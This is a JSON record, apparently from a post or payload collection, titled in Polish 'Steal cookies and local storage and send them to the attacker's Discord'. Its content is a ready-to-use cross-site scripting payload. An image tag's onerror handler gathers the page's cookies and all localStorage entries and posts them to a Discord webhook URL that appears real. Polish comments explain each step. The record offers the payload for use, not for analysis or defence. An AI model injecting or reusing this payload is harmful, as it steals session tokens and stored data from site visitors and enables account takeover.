    {
      "id": "03c3",
      "title": "Ukradnij ciastka i local storage i wyślij go na discorda atakującego",
      "content": "<img src=\"xd\" onerror=\"const webhookUrl = 'https://discord.com/api/webhooks/1333932771269410826/9z92ujGV8SQMAlMSJaymyUKdbXitrv8ozdydq986rP8ntq2_GFaaNP_r_IsjC4xYD2fj';\n\n// Funkcja do pobierania ciasteczek i formatowania ich\nconst getCookiesList = () => {\n  const cookies = document.cookie.split(';');\n  return cookies.map(cookie => cookie.trim()).join('\\n'); // Zwraca ciasteczka jako listę\n};\n\n// Funkcja do pobierania danych z localStorage i formatowania ich\nconst getLocalStorageList = () => {\n  const localStorageData = Object.entries(localStorage); // Przekształcamy dane localStorage do tablicy par [key, value]\n  return localStorageData.map(([key, value]) => `${key}: ${value}`).join('\\n'); // Zwraca dane localStorage w formie listy\n};\n\n// Tworzenie treści wiadomości\nconst messageContent = `\n**Cookies:**\n${getCookiesList()}\n\n**LocalStorage:**\n${getLocalStorageList()}\n`;\n\n// Funkcja wysyłająca dane do Discord Webhook\nconst sendToDiscord = async () => {\n  const body = JSON.stringify({\n    content: messageContent, // Treść wiadomości zawierająca cookies i localStorage\n  });\n\n  try {\n    const response = await fetch(webhookUrl, {\n      method: 'POST', // Metoda POST do wysłania danych\n      headers: {\n        'Content-Type': 'application/json', // Nagłówek mówiący, że wysyłamy JSON\n      },\n      body: body, // Ciało żądania z danymi\n    });\n\n    if (response.ok) {\n      console.log('Wiadomość została wysłana!');\n    } else {\n      console.error('Wystąpił błąd podczas wysyłania wiadomości:', response.status);\n    }\n  } catch (error) {\n    console.error('Błąd:', error);\n  }\n};\n\n// Wywołanie funkcji\nsendToDiscord();\" />",
      "userName": "Admin",
      "userNumber": "1"
    },
